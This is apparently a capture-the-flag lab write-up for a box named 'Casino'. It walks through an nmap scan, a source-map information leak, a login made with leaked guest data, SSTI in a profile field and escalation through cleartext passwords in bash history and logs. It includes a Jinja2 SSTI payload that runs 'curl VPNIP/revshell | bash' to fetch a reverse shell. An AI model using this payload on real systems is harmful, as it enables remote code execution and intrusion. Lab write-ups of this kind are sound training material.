# Casino

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 90:5c:78:46:94:4a:30:b8:55:80:cf:c3:99:07:f6:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLwM6Rx1uxf4MkJ82I7P1ibxjL/nspNAARx9ajEM+YE0eQ1rhsGudbbcvKlM9BDB24JsiBuwo14Xdpu/lfdY25E=
|   256 69:ee:6e:65:71:ba:36:01:9c:7c:34:42:f9:5d:6e:29 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMyduYVnHOunyyXd545/aqKGWY1PdbLTflN5kWBWyHpJ
80/tcp   open  http    syn-ack ttl 61 Werkzeug httpd 3.1.8 (Python 3.10.18)
| http-title: Hack Smarter World - Guest WiFi & Portal
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/3.1.8 Python/3.10.18
2222/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 7d:c5:f5:ba:03:3e:f0:76:5c:9d:47:b6:39:b5:c7:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPPaacRdmjYRrc09e1YOHq8B6HlcsfF9389BldErXZCbOyMVNJEKU4p26qJiI2D3EFCWib/O9xWcWq9OTzNwoj/ejaFm7Kr4m/boJJLBbXxU6jJFRT5JNjnEHqE95c8YY0yVFs1CmIV4KoNCOYdPnIeQ5Exhhr0eAcAUrfOxQP2hcWQH13r4bDl1JTGCP336W5DShrTPWyFir3gVaf3YxvbgyCaY/RZKR38/W4H9ieBP9nm7hf4/00cnSqky8i1aqKxNyHgjKbwsdADfJUoXoTJ+P9P36C9/ZN5TVJAGMfRDUVnq6e0PAeKI+1cmk2cZ/HmTZO9Z7O5Ke+4pmI67Aj5X8tDpAYwX1Qxn4hStc3Bsk8MLtYx1ZwoOL+SXM83qO6F27jTlY+H5poNK7uH0/9GGUQDJpj9SydAIRtJePRv8GFKwb1V7OuFQvtX80LJs0h9LMA5yl+fXlYOiZzQGcGRzcyoxYNEq+XVsMbOo8ItXSmMe5iUTl4A9c6aArM9Bc=
|   256 ed:5d:fa:ea:74:a0:56:b1:39:59:fc:c5:22:1e:5e:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOYXqo1SuDeYulTFW8dGh/ebvlk4lyYPHwhWKZvP8FVDlpWqPrkqCVEi4aqQF3NGXfcKnQ3WM3Rrcuu0/GveIRU=
|   256 50:31:d9:54:80:42:b8:44:cb:40:66:ea:cf:8f:cf:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWMtXHyJjYnm4rmwcwMnUic9Cf+9LnaxFSfALdNAzb1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 (96%), HP P2000 G3 NAS device (93%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), Linux 5.14 - 6.8 (93%), Linux 3.2 - 4.14 (93%), Linux 4.15 - 5.19 (93%), Linux 2.6.32 - 3.10 (93%), Linux 5.4 - 5.15 (92%), Linux 3.10 - 4.11 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=11/1%OT=22%CT=%CU=39723%PV=Y%DS=3%DC=T%G=N%TM=6AE7553D%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=22)
SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=21)
OPS(O1=M510ST11NW7%O2=M510ST11NW7%O3=M510NNT11NW7%O4=M510ST11NW7%O5=M510ST11NW7%O6=M510ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M510NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Sun Nov  1 10:05:25 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   78.44 ms 10.200.0.1
2   ...
3   78.57 ms 10.1.233.34
```



### Port 80 - HTTP

<figure><img src="../.gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>



Inspecting the login page source code revealed an embedded application script at /static/js/app.min.js, which contained a developer comment exposing an available source map file (app.min.js.map). Fetching this map file successfully reconstructed the frontend source code, revealing information disclosure through internal API logic. This leak exposed an unauthenticated backend endpoint (/api/v1/rooms/status?status=occupied) that can now be targeted to enumerate valid guest room details.

<figure><img src="../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

Navigating directly to the exposed endpoint returned a raw JSON response containing a complete directory of currently occupied rooms. This sensitive information disclosure leaked full guest names, room numbers and membership tiers (such as guest\_name: "Smith", room\_number: 105), providing the valid credentials needed to bypass the portal.



<figure><img src="../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (418).png" alt=""><figcaption></figcaption></figure>

I successfully accessed the user dashboard. Testing the "Display Name" field within the profile settings for Server-Side Template Injection (SSTI) proved successful, confirming that user input was being executed by the underlying template engine.

<figure><img src="../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

```
SSTI check:- {{7*7}}
```

<figure><img src="../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

crafted a reverse shell payload for full terminal shell access&#x20;

```
Command:- {{request.application.__globals__.__builtins__.__import__('os').popen('curl VPNIP/revshell | bash').read()}}

```

<figure><img src="../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>



### Shell as www-data

<figure><img src="../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

Found user.txt file in george home directory

<figure><img src="../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

Looking at george bash history, found cleartext password for user david&#x20;

<figure><img src="../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation

After establishing a shell as user david on port 2222, local enumeration showed he belonged to the adm group, which granted read permissions to system logs under /var/log. Searching through these log files uncovered an exposed cleartext root password, allowing for a direct privilege escalation via su root to gain full root access.



<figure><img src="../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

